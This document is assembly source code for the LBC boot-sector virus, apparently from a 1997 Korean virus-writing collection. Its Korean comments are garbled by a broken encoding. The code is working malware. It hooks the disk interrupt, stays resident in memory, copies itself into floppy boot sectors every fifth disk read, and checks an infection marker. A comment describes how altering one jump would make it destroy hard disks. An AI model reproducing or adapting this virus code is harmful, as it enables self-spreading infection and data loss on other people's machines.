;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                             LBC virus                     CVC #02  97/09
;
; ���̷����� : LBC
; ������ : �� (Njh ?)
; ������ : �ѱ� (89�� �߰�)
; �м��� : KOV
; ������� : MASM, TASM
;
; ���� : �÷���,MBR
; ��ȣ : x
; ������ : x
; ���� : x
; ���� : ���� �ҽ��� KOV �� �Ϻ� ������ ���̴�. �ҽ��� �ۼ��Ͻ� �в� ����帰
;        ��.
;        Brain ���̷����� ������ �ΰ� ������ ���̷����̴�.
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 CODE           SEGMENT
                ASSUME  CS:CODE, DS:CODE

		ORG 100h
START:          CLI                             ; ���ͷ�Ʈ ����ũ
                JMP     SHORT MAIN              ;
		NOP
                                                ; Brain ���̷��� �ĺ���
                DW      1234h                   ; ������� �ʴ� �κ�
LBC_MARK        DW      6845h                   ; ���̷��� �ĺ���

MAIN:           XOR     AX,  AX                 ; ���α׷����� & ���α׷� �ʱ�ȭ
		MOV	DS,  AX
		MOV	SS,  AX
		MOV	SP,  0FFF0h
                STI                             ; ���ͷ�Ʈ �÷��� ��Ʈ

                MOV     BX,  0413h              ; �޸� ũ�� �˻�
		MOV	AX,  [BX]
		DEC	AX
                DEC     AX                      ; �޸� ũ�� ���� (2 KB)
		MOV	[BX],  AX

                MOV     CL,  06h                ; �ű� ���� ���׸�Ʈ ���
		SHL	AX,  CL
		MOV	ES,  AX

                MOV     SI,  7C00h              ; �ڽ��� ������
                MOV     DI,  0100h              ; �ű� ���� ������
		MOV	CX,  0200h
		CLD
                REPZ    MOVSB                   ; ���α׷� ����
		PUSH	ES                ; ���ֵ� ���̷��� ���α׷����� ����
		MOV	AX,  OFFSET CHANGE_INT13
		PUSH	AX
		RETF

                                                ; ���� ���� ���� ���۵�
CHANGE_INT13:   MOV     BX,  004Ch              ; ���ͷ�Ʈ ���� ����
                MOV     CX,  [BX]               ; ������ INT 13h�� ������
                MOV     DX,  [BX + 02h]         ; ������ INT 13h�� ���׸�Ʈ
                MOV     AX,  OFFSET NEW_INT13   ; ���ο� INT 13h�� ������
		MOV	[BX],  AX
                MOV     AX,  CS                 ; ���ο� INT 13h�� ���׸�Ʈ
		MOV	[BX + 02],  AX
		MOV	DS,  AX
                MOV     WORD PTR OLD_INT13O,CX  ; ���� INT 13h�� ������ ����
                MOV     WORD PTR OLD_INT13S,DX  ; ���� INT 13h�� ���׸�Ʈ ����


                                                ; ������ ��Ʈ ��Ʈ�� �δ� �б�
                MOV     BYTE PTR FUNC_NUM,02h   ; INT 13h�� �Ķ���� ����
                MOV     BYTE PTR BOOT_DRIVE,00h
                MOV     WORD PTR TRACK_SECTOR,0003h
                MOV     BYTE PTR BOOT_HEAD,01h

                XOR     AX,  AX                 ; ������ �δ��� ���׸�Ʈ
		PUSH	AX
                MOV     ES,  AX                 ; INT 13h�� ���� ���� ���׸�Ʈ
                MOV     AX,  7C00h              ; ���� �δ��� ������
		PUSH	AX
                MOV     WORD PTR BUFFERS,  AX   ; INT 13h�� ���� ���� ������

		CALL	INT_13H
		JNB	NO_ROM_BASIC
                INT     18h                     ; ������ ���� �� ���� ���
                                                ; ROM BASIC �۵� (�ֱ� ��ǻ��
                                                ; ���� ����)

NO_ROM_BASIC:	RETF                  ; ������ �δ��� ���� ��� �װ����� ����


OLD_INT13O      DW      0EC59h                  ; ���� INT 13h�� ������
OLD_INT13S      DW      0F000h                  ; ���� INT 13h�� ���׸�Ʈ
INTERVAL        DB      05h                     ; ���� ����(�� 5ȸ ���� ����)
FUNC_NUM        DB      03h                     ; ��� �ڵ� (2=�б�,3=����)
BOOT_DRIVE      DB      00h                     ; ����̺� ��ȣ
BOOT_HEAD       DB      00h                     ; ��� ��ȣ
TRACK_SECTOR    DW      0001h                   ; Ʈ���� ���� ��ȣ
BUFFERS         DW      0100h                   ; ������ ������

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;               Int     13h
;
NEW_INT13:      STI                             ; ���ͷ�Ʈ �÷��� SET
                CMP     AH,  02h                ; ��ũ �б� �˻�
                JNZ     NO_INFECT

                CMP     DL,  01h                ; A �Ǵ� B ����̺��ΰ� �˻�
                JG      NO_INFECT               ; �̰��� ������ ������

; ���� JB ������ �ٲ۴ٸ� �ϵ� ��ũ�� �ı� ��Ű�� ���� ����.
; ��            CMP     DL,02h
;               JB      NO_INFECT2 �ϸ� �ϵ� ��ũ�� �ı��ϴ� ���� ����.
; �ϵ� ��ũ�� LBC ���̷����� �����Ǹ� ������ ���� �ʴµ� �� ������ ���̷���
; �����ڴ� ���� �÷��� ������ �����߱� ������ �ϵ� ��ũ�� �������� �ʱ� ��
; ���̴�.
;
                DEC     BYTE PTR CS:INTERVAL    ; ���� ���� �˻�
                JNZ     NO_INFECT

                MOV     BYTE PTR CS:INTERVAL, 05h ; ���� ���� �ʱ�ȭ

                PUSH    AX                      ; �������� ����
		PUSH	BX
		PUSH	CX
		PUSH	DX
		PUSH	ES
		PUSH	DS

                PUSH    CS                      ; ����Ÿ ���׸�Ʈ ����
		POP	DS

                                                ; ���� ������� ������ ��Ʈ ���� �б�
                MOV     BYTE PTR BOOT_DRIVE, DL ; INT 13h�� ���� �Ķ���� ����
                MOV     BYTE PTR BOOT_HEAD, 00h
                MOV     WORD PTR TRACK_SECTOR, 0001h
                MOV     WORD PTR BUFFERS, 0400h
                MOV     BYTE PTR FUNC_NUM, 02h

                CALL    ES_SETING               ; ES ���� �� ������ INT 13h ����
                JB      NO_INFECT1              ; �б� �����϶��� ����

                                                ; �̹� ������ �����ΰ� �˻�
                MOV     AX,  LBC_MARK           ; ���̷��� �ĺ��� �˻�
		MOV	BX,  OFFSET LBC_MARK + 300h
		CMP	AX,  [BX]
                JNZ     INFECT                  ; �������� ���� �����̸� ����
                JMP     SHORT NO_INFECT1        ; ������ �����̸� �� ���� ����
		NOP


;               ���� ������� ���� ����
;               ������ ��Ʈ��Ʈ�� �δ� ���α׷��� ���� ���� 11�� ���� (360 KB��
;               ���)
INFECT:         MOV     BYTE PTR FUNC_NUM,03h   ; INT 13h�� ���� �Ķ����(����)
                MOV     BYTE PTR BOOT_HEAD,01h  ; ���� ���� 10
                MOV     WORD PTR TRACK_SECTOR,0003h
                CALL    ES_SETING               ; ES ���� �� ������ INT 13h ����
                JB      NO_INFECT1              ; ���� ������ ��� ���� ����


;               ���̷��� �δ� ���α׷� (LBC)�� ��Ʈ ���Ϳ� ����
		MOV	BYTE PTR BOOT_HEAD,  00h
		MOV	WORD PTR TRACK_SECTOR,  0001h
		MOV	WORD PTR BUFFERS,  0100h
		CALL	ES_SETING            ; ES ���� �� ������ INT 13h ����


NO_INFECT1:     POP     DS                      ; �������� ����
		POP	ES
		POP	DX
		POP	CX
		POP	BX
		POP	AX


NO_INFECT:      JMP     DWORD PTR CS:[OLD_INT13O]     ; ������ INT 13h�� ����

ES_SETING:      PUSH    CS                      ; ES �������� ����
		POP	ES
INT_13H:        MOV     CX,  0004h              ; ��õ� Ƚ�� ����

RETRY:          PUSH    CX                      ; ��õ� Ƚ�� ����

;               INT 13h�� �Ķ���� ����
                MOV     AH,  FUNC_NUM           ; ��� �ڵ�
                MOV     AL,  01h                ; ���� ��
                MOV     BX,  BUFFERS            ; ���� ������
                MOV     CX,  TRACK_SECTOR       ; Ʈ���� ���� ��ȣ
                MOV     DH,  BOOT_HEAD          ; ��� ��ȣ
                MOV     DL,  BOOT_DRIVE         ; ����̺� ��ȣ

                PUSHF                           ; ���ͷ�Ʈ ������ ���� ���� ����
                CALL    DWORD PTR [OLD_INT13O]  ; ������ INT 13h ȣ��
                JNB     NO_ERROR                ; ���� �˻�

                MOV     AH,  00h                ; ���� �߻��� ��ũ ����Ʈ
                PUSHF                           ; ���ͷ�Ʈ ������ ���� ���� ����
                CALL    DWORD PTR [OLD_INT13O]  ; ������ INT 13h ȣ��

                POP     CX                      ; ��õ� Ƚ�� ����
                LOOP    RETRY                   ; ��õ�

                STC                             ; ���� ������ ���� ĳ�� ��Ʈ
		JMP	SHORT RETURN
		NOP
NO_ERROR:       POP     CX                      ; ���� ����
RETURN:		RET                       ; ���ֵ� ���̷��� ���α׷����� ����



                DB      ' virse program   messge Njh to Lbc '
; virus program message Njh to Lbc
; �� �߸� ������ ����. �����ڴ� �Ƹ��� ���� � �л��ΰ� ����.

                DB      166 DUP (00h)

CODE		ENDS
		END	START

;
; �������� LBC ���̷����� ������ ���̷������� ����.
; ���� ��ȸ�� �÷��� ����(?)�� LBC ���̷����� ��� ���� �ߴ���
; ���� ���̷����� ������ �м��� ���ڴ�.
;